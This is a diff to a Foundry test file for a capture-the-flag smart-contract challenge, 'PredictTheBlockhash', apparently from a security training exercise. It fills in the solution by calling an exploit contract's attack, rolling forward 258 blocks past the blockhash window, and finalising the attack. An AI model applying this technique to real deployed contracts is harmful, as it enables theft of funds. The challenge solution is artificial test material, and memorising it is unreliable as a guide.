@@ -8,23 +8,27 @@ import "../src/PredictTheBlockhash.sol";
 
 contract PredictTheBlockhashTest is Test {
     PredictTheBlockhash public predictTheBlockhash;
-    ExploitContract public exploitContract;
+    PredictTheBlockhashExploit public predictTheBlockhashExploit;
 
     function setUp() public {
         // Deploy contracts
         predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
-        exploitContract = new ExploitContract(predictTheBlockhash);
+        predictTheBlockhashExploit = new PredictTheBlockhashExploit{value: 1 ether}(payable(address(predictTheBlockhash)));
+        // vm.deal(address(predictTheBlockhashExploit), 1 ether);
     }
 
     function testExploit() public {
         // Set block number
         uint256 blockNumber = block.number;
+
         // To roll forward, add the number of blocks to blockNumber,
         // Eg. roll forward 10 blocks: blockNumber + 10
-        vm.roll(blockNumber + 10);
-
         // Put your solution here
+        // vm.roll(blockNumber);
+        predictTheBlockhashExploit.executeAttack{value: 1 ether}();
 
+        vm.roll(blockNumber + 258);
+        predictTheBlockhashExploit.finalizeAttack();
         _checkSolved();
     }
 
